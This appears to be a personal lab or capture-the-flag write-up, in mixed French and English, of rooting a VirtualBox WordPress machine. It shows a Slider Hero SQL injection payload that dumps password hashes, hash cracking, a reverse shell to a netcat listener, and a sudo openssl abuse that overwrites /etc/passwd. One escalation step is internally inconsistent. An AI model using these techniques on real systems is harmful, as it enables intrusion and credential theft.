## Recon
```
❯ rustscan --ulimit=5000 --range=1-65535 -a $ip -- -sV
Open 192.168.56.50:22
Open 192.168.56.50:80

Scanned at 2023-12-10 17:04:27 GMT for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))

❯ nmap -sV -Pn -p1000-9999 --min-rate 3000 $ip
❯ nmap -sC -sV -Pn -p80 $ip
Nmap scan report for 192.168.56.50
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.57 (Debian)
| http-git: 
|   192.168.56.50:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Initial WP install 
|_http-title: WordPress &#8211; Just another WordPress site
MAC Address: 08:00:27:65:86:E6 (Oracle VirtualBox virtual NIC)
```
wordpress found : version `5.8.1`
`.git` found also
I will first dump the `git` using gitTools
```
❯ bash gitdumper.sh http://192.168.56.50/.git/ exam

```

Let's run wpscan on the website when i dump the `.git`
```
❯ wpscan --url http://192.168.56.50/ -e u
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.50/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] contributor
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
2 users found:
`admin` and `contributor`

Now i will use the extractor on gittools to extract
```
❯ bash extractor.sh ../Dumper/exam examExtract
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/wp-login.php
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/wp-mail.php
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/wp-settings.php
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/wp-signup.php
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/wp-trackback.php
[+] Found file: /home/bloman/tools/GitTools/Extractor/examExtract/0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9/xmlrpc.php
```

Now analyze files
```
❯ tree 0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9 | less
0-e3269dd6f9ccc1a1019d79948b6c13fc65d804c9
├── commit-meta.txt
├── index.php
├── license.txt
├── readme.html
├── TODO_staff.txt
├── wp-activate.php
├── wp-admin
│   ├── about.php
│   ├── admin-ajax.php
│   ├── admin-footer.php
│   ├── admin-functions.php
│   ├── admin-header.php
│   ├── admin.php
│   ├── admin-post.php
│   ├── async-upload.php
│   ├── authorize-application.php
│   ├── comment.php
│   ├── credits.php

├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php

316 directories, 2621 files
```
I will search for sensitive files
```
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'password');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```
Nothing seems to be interessting here, so now i will try to crack the password 
```
❯ wpscan --url 192.168.56.50 -e u --passwords password.txt


```
I found a TODo_lIst for the `staff`
```
DONE
Créer le compte contributeur du prestataire et lui envoyer les identifiants (contributor:Afd9ky0xz6jrD26eT9gx2w)

WIP
Finir l'installation et la configuration des plugins

TODO
Change le mot de passe de l'administrateur
Nettoyer le répertoire web (.git + TOTO_staff.txt)
```
Now a partir je vais me connecter sur le compte `contributor` avec son mot de passe.
Je vais aussi essayer de me connecter avec ca sur ssh
```
❯ ssh contributor@192.168.56.50
The authenticity of host '192.168.56.50 (192.168.56.50)' can't be established.
ED25519 key fingerprint is SHA256:ZwSb2iG/JXSRtsnixKnfAChXxwtvfPHYoHs87scdipw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.50' (ED25519) to the list of known hosts.
contributor@192.168.56.50's password: 
Permission denied, please try again.
contributor@192.168.56.50's password: 
```
Ca marche pas. donc je vais sur le wordpress.
avec ca 
```
Finir l'installation et la configuration des plugins
```
je vais enumerer les pluginis.
found `slider Hero`
https://wpscan.com/vulnerability/52c8755c-46b9-4383-8c8d-8816f03456b0/
https://sploitus.com/exploit?id=WPEX-ID:52C8755C-46B9-4383-8C8D-8816F03456B0

Now je l'essaie. 
Je fais cree un post et je met ceci a l'interieur
```
[hero-button id='1 UNION SELECT 2,"",2,1,NULL,"",NULL,0,NULL,"{}",999,NULL,CONCAT(CONCAT(CONCAT(CONCAT(FROM_BASE64("eyJidXR0b25fdGV4dCI6Ig=="),user_login),":"),user_pass),FROM_BASE64("IiwiYnV0dG9uX3VybCI6IiMiLCJidXR0b25fdGFyZ2V0IjoiX2JsYW5rIiwiYnV0dG9uX2JvcmRlciI6InNxdWFyZSIsImJ1dHRvbl9zdHlsZSI6ImZ1bGxfYmFja2dyb3VuZCIsImJ1dHRvbl9lZmZlY3QiOiJleGJvcmRlciIsImJ1dHRvbl9mb250X3dlaWdodCI6Im5vcm1hbCIsImJ1dHRvbl9mb250X3NpemUiOiIiLCJidXR0b25fbGV0dGVyX3NwYWNpbmciOiIiLCJidXR0b25fY29sb3IiOiIjMDAwMDAwIiwiYnV0dG9uX2hvdmVyX2NvbG9yIjoiIiwiYnV0dG9uX2JhY2tncm91bmRfY29sb3IiOiIjZmZmZmZmIiwiaGVyb19idXR0b25fc2hvcnRjb2RlIjoiMSIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZV92YWx1ZSI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2hvdmVyX2NvbG9yIjoiIn0=")),FROM_BASE64("eyJidXR0b25fdGV4dCI6IkRvd25sb2FkIE5vdyIsImJ1dHRvbl91cmwiOiIjIiwiYnV0dG9uX3RhcmdldCI6Il9ibGFuayIsImJ1dHRvbl9ib3JkZXIiOiJzcXVhcmUiLCJidXR0b25fc3R5bGUiOiJmdWxsX2JhY2tncm91bmQiLCJidXR0b25fZWZmZWN0IjoiZXhib3JkZXIiLCJidXR0b25fZm9udF93ZWlnaHQiOiJub3JtYWwiLCJidXR0b25fZm9udF9zaXplIjoiIiwiYnV0dG9uX2xldHRlcl9zcGFjaW5nIjoiIiwiYnV0dG9uX2NvbG9yIjoiIzAwMDAwMCIsImJ1dHRvbl9ob3Zlcl9jb2xvciI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2NvbG9yIjoiI2ZmZmZmZiIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZSI6IiIsImhlcm9fYnV0dG9uX3Nob3J0Y29kZV92YWx1ZSI6IiIsImJ1dHRvbl9iYWNrZ3JvdW5kX2hvdmVyX2NvbG9yIjoiIn0="),"",NULL,NULL,NULL,NULL,NULL FROM wp_users']
```
Ca me ramena ca
```
admin:$P$Braf7K.2vp7FZV3.6vdmmnA7oYSthV1
```
Maintenant c'est lheure de cracker ce hash
```
❯ hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
$P$Braf7K.2vp7FZV3.6vdmmnA7oYSthV1:spidermonkey           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$Braf7K.2vp7FZV3.6vdmmnA7oYSthV1
Time.Started.....: Sun Dec 10 19:13:43 2023 (24 secs)
Time.Estimated...: Sun Dec 10 19:14:07 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2402 H/s (6.38ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 55296/14344385 (0.39%)
Rejected.........: 0/55296 (0.00%)
Restore.Point....: 54272/14344385 (0.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192
Candidate.Engine.: Device Generator
Candidates.#1....: 250895 -> grad2010
Hardware.Mon.#1..: Temp: 80c Util: 90%

Started: Sun Dec 10 19:13:09 2023
Stopped: Sun Dec 10 19:14:08 2023

```
Bien, maintenant on se log en admin avec ce mot de passe.

## Shell
J'ai un acces admin, maintenant je vais essayer d'avoir un shell
Pour ca, je vais modifier le `search.php` dans les `themes` et inject le shell de `Ivan Seck`
Ca prend pas upload
Ok j'essaie Metasploit
```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] Authenticating with WordPress using admin:spidermonkey...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/qWQOVLmCdN/aQmBfMgaxT.php...
[!] This exploit may require manual cleanup of 'aQmBfMgaxT.php' on the target
[!] This exploit may require manual cleanup of 'qWQOVLmCdN.php' on the target
[!] This exploit may require manual cleanup of '../qWQOVLmCdN' on the target
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/wp_admin_shell_upload) > 


```
Donc ca aussi ca prend pas, :) Ouff.
Je vais ensuite essayer de mettre un plugin Vulnerable
https://www.exploit-db.com/exploits/36374
Je l'install et je l'active

```
use exploit/unix/webapp/wp_slideshowgallery_upload
set rhosts 192.168.56.50
set targeturi /wordpress
exploit
```
Not working oh.
Humm apres de longue heure. j'ai essayer powny shell et ca a macher
J'ai upload dans le plugin le `shell.php` ensuite je me suis rendu
http://192.168.56.50/wp-content/uploads/2023/12/shell-3.php pour l'executer

J'ai pas pu avoir le shell car il y'a un firewall la dessus.
donc je l'ai bypass en utilisant le port `443` sur mon powny shell
```
❯ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.50] 52424
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
www-data@exam:/home$ ls -la /home/user
ls -la /home/user
total 28
drwxr-xr-x 2 user user 4096 Dec 10 18:01 .
drwxr-xr-x 3 root root 4096 Oct 25 10:50 ..
-rw-r--r-- 1 user user 1708 Oct 25 10:50 .bash_history
-rw-r--r-- 1 user user  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 user user 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 user user  807 Apr 23  2023 .profile
-r-------- 1 user user   33 Oct 25 14:32 flag.txt
www-data@exam:/home$ 
```
je vois qu'il ya un seul `user`, maintenant je dois avoir ces `priv`
Let's check les ports
```
www-data@exam:/home$ ss -tupln 
ss -tupln 
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp   LISTEN 0      100        127.0.0.1:8461      0.0.0.0:*          
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
tcp   LISTEN 0      10         127.0.0.1:587       0.0.0.0:*          
tcp   LISTEN 0      10         127.0.0.1:25        0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      128             [::]:22           [::]:*          
www-data@exam:/home$ 
```
J'avais trouver quelque creds `mysql`, voyons voir ca. Mais ca marche pas.
Let's use linpeas

```
╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 Jul 23 23:00 /etc/mysql/mariadb.cnf
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 3101 Oct 25 10:51 /var/www/html/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'suG6vP1rWzBUqIL2aaT6oA');
define('DB_HOST', 'localhost');
```
Essayons ca
```
www-data@exam:/tmp$ mysql -u wordpress -p -h localhost
mysql -u wordpress -p -h localhost
Enter password: suG6vP1rWzBUqIL2aaT6oA

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 62
Server version: 10.11.4-MariaDB-1~deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
Cool
```
15 rows in set (0.000 sec)

MariaDB [wordpress]> selselect * from wp_users;
select * from wp_users;
+----+-------------+------------------------------------+---------------+---------------------------+----------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login  | user_pass                          | user_nicename | user_email                | user_url             | user_registered     | user_activation_key | user_status | display_name |
+----+-------------+------------------------------------+---------------+---------------------------+----------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin       | $P$Braf7K.2vp7FZV3.6vdmmnA7oYSthV1 | admin         | admin@localhost.com       | http://192.168.56.50 | 2023-10-25 08:51:24 |                     |           0 | admin        |
|  2 | contributor | $P$BIRvppC9453R0Aatd1kHLZYjy6l/Kf/ | contributor   | contributor@localhost.com |                      | 2023-10-25 08:52:27 |                     |           0 | contributor  |
+----+-------------+------------------------------------+---------------+---------------------------+----------------------+---------------------+---------------------+-------------+--------------+
```
C'est les meme hashes et j'ai deja cracker
Our 1st flag
```
www-data@exam:/var/www$ ls
ls
flag.txt  html
www-data@exam:/var/www$ cat flag.txt
cat flag.txt
21cecaf5475fc503882c0ed6a8d1a31b
www-data@exam:/var/www$ 
```
Let's use the mysql password on the user
```
www-data@exam:/var/www/html$ su user
su user
Password: suG6vP1rWzBUqIL2aaT6oA

user@exam:/var/www/html$ cd                             cd
cd
user@exam:~$ 
user@exam:~$ ls                 ls
ls
flag.txt
user@exam:~$ cat *              cat *
cat *
c23c3967fc48959f0ef7c4b69618fd2c
user@exam:~$ 
```
Yeah ca prend. notre 2nd flag.
Je vais maintenant utiliser ce pass pour me log en `ssh`

## Escalation on root 
```
user@exam:~$ sudo -l
Matching Defaults entries for user on exam:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on exam:
    (root) NOPASSWD: /opt/*, /usr/bin/ls
    (root) NOEXEC: /usr/bin/find, /usr/bin/openssl
user@exam:~$ 
```

apres tant de recherche, je vais utiliser `openssl` pour d'abord le file read

```
user@exam:/opt$ LFILE=/etc/shadow
user@exam:/opt$ sudo openssl enc -in "$LFILE"
[sudo] password for user: 
root:$y$j9T$basvMhMTbQHzftBtZtQtc1$rX69HdwxZozeeQ/bzBCViGD5qzN8g1a/ajO.dM1Ehw4:19655:0:99999:7:::
daemon:*:19655:0:99999:7:::
bin:*:19655:0:99999:7:::
sys:*:19655:0:99999:7:::
sync:*:19655:0:99999:7:::
games:*:19655:0:99999:7:::
man:*:19655:0:99999:7:::
```
Je pouvais m'arreter et juste cracker le mot de passe du root

**Flag root**
```
user@exam:/opt$ LFILE=/root/flag.txt
user@exam:/opt$ sudo openssl enc -in "$LFILE"
2996b238e3ac7be0e102a35c5db53577
user@exam:/opt$ 
```
Je vais essayer d'avoir un shell sur la box root
```
user@exam:/opt$ LFILE=/etc/passwd
user@exam:/opt$ TF=$(mktemp)
user@exam:/opt$ echo 'root::0:0::/root:/bin/bash' >> $TF
user@exam:/opt$ sudo openssl enc -in "$TF" -out "$LFILE"
user@exam:/opt$ su - bloman
bloman@exam:~# id
uid=0(bloman) gid=0(root) groups=0(root)
bloman@exam:~# hostnamectl
 Static hostname: exam
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 63fb19b1c9da4b6ea608ec195c3821f1
         Boot ID: ba992060241a4f9487caa710e5c92ac0
  Virtualization: oracle
Operating System: Debian GNU/Linux 12 (bookworm)  
          Kernel: Linux 6.1.0-13-amd64
    Architecture: x86-64
 Hardware Vendor: innotek GmbH
  Hardware Model: VirtualBox
Firmware Version: VirtualBox
bloman@exam:~# 
```

flags
```
bloman@exam:~# find / -type f -name flag.txt -ls 2>/dev/null
   131077      4 -r--------   1 bloman   root           33 Oct 25 14:32 /root/flag.txt
   393222      4 -r--------   1 1000     user           33 Oct 25 14:32 /home/user/flag.txt
  1048585      4 -r--------   1 33       www-data       33 Oct 25 14:32 /var/www/flag.txt
bloman@exam:~# 
```